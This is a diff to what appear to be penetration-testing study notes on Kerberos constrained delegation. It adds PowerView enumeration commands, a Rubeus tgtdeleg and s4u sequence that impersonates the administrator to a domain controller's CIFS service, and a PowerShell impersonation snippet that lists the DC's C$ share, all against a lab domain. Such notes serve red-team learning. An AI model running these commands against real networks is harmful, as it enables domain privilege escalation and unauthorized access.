@@ -231,11 +231,10 @@ kerberos::list /export #Another way
 
 ```shell
 # Windows 
+## Powerview
 Get-NetUser -TrustedToAuth
 Get-NetComputer ws02 | select name, msds-allowedtodelegateto, useraccountcontrol | fl
 Get-NetComputer ws02 | Select-Object -ExpandProperty msds-allowedtodelegateto | fl
-
-## Powerview
 Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
 Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
 
@@ -244,3 +243,23 @@ ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))"
 
 ```
 ![Screenshot 2024-06-18 at 20-42-44 Kerberos Constrained Delegation Red Team Notes](https://github.com/kiro6/penetration-testing-notes/assets/57776872/dfc45db7-65f4-412f-b58f-8b904ff5c606)
+
+
+### Delegation User
+```
+# request a delegation TGT for the user
+.\Rubeus.exe tgtdeleg
+
+# Using rubeus, we can now request TGS for administrator@offense.local, who will be allowed to authenticate to CIFS/dc01.offense.local
+Rubeus.exe s4u /ticket:<ticket hash> /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /dc:dc01.offense.local /ptt
+```
+### Delegation System/Machine
+```shell
+[Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
+$idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
+$idToImpersonate.Impersonate()
+[System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
+
+ls \\dc01.offense.local\c$
+```
+
